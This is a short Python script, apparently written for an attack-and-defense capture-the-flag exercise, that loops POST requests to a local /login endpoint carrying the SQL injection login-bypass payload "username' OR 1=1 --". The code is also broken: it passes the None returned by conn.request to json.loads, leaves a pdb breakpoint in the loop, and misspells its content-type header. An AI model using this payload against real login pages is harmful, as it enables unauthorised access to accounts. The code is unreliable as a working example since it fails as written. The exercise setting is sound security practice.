"""
Make a POST request and get a JSON response, the vulnerable app will respond with a {'status': 'succes'} response
"""

import http.client
import json

ip_mask = '10.0.%d.101'
WEB_PORT = 9009


while True:
    payload = "username\' OR 1=1 --&password=admin" 
    #response = http.request('POST', f'http://{ip_mask % 5}:{WEB_PORT}/login', fields=payload)
    conn = http.client.HTTPConnection("localhost", WEB_PORT, timeout=5)
    headers = {'Content-type': 'application/xxx-www-form-urlencoded'}
    response = conn.request('POST', f'/login', body=payload)
    import pdb; pdb.set_trace()
    decode = json.loads(response)
    if decode['status'] == 'success':
        print("Success")
    else:
        print("Failed")
